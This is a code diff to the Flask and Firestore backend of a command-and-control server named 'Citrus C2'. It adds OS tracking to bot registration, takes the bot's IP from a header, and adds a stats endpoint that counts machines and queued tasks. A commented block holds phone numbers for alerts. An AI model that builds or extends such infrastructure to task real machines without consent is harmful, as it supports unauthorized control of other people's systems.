@@ -11,6 +11,7 @@ from . import routes
 
 # from dotenv import load_dotenv
 import os
+import string
 
 client_api = Blueprint('client_api', __name__)
 # load_dotenv()
@@ -25,28 +26,30 @@ cred = credentials.Certificate("serviceAccountKey.json")
 firebase_admin.initialize_app(cred)
 db = firestore.client()
 
-@routes.route('/bot/register/<string:hostname>', methods=['POST'])
-def index(hostname):
+@routes.route('/bot/register/<string:os>/<string:hostname>', methods=['POST'])
+def index(os, hostname):
     id = str(uuid.uuid4())
 
     db.collection('machines').add({
         'uuid': id,
-        'ip': request.remote_addr,
+        'ip': request.headers.get('X-Real-IP'),
         'hostname': hostname,
         'poll_rate': 5,
         'tasks': [],
+        'os': os
     })
 
     # message = client.messages.create(
     #     to="+17148512888", 
     #     from_="+12185208855",
-    #     body=f"\n=Citrus C2 Notification: New Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
+    #     body=f"\n=Citrus C2 Notification: New {string.capwords(os)} Machine=\nIP: {request.remote_addr}\nHostname: {hostname}\nUUID: {id}"
     # )
-
     return {'uuid': id}
 
 
-@routes.route('/bot/poll', methods=['GET'])
+
+
+@routes.route('/bot/poll', methods=['GET', 'POST'])
 def poll():
     machines = db.collection('machines').where(
         'uuid', '==', request.headers.get('uuid')).limit(1).get()
@@ -77,6 +80,7 @@ def info():
         tmp['hostname'] = x.to_dict()['hostname']
         tmp['uuid']=x.to_dict()['uuid']
         tmp['ip']=x.to_dict()['ip']
+        tmp['os']=x.to_dict()['os']
         res.append(tmp)
     return jsonify(res)
 
@@ -106,3 +110,20 @@ def push():
     machine.reference.update({'tasks': tasks})
 
     return {'success': True}
+
+@routes.route('/stats', methods=['GET'])
+def stats():
+    machines = db.collection('machines').get()
+
+    if not machines:
+        return {"error": "there appear to be no machines added, how can you get stats with no machines lol"}
+    
+    res = {}
+    count = 0
+    res['machine_count'] = len(machines)
+    for x in machines:
+        count += len(x.to_dict()['tasks'])
+    res['scheduled_tasks_count'] = count
+
+    return res
+
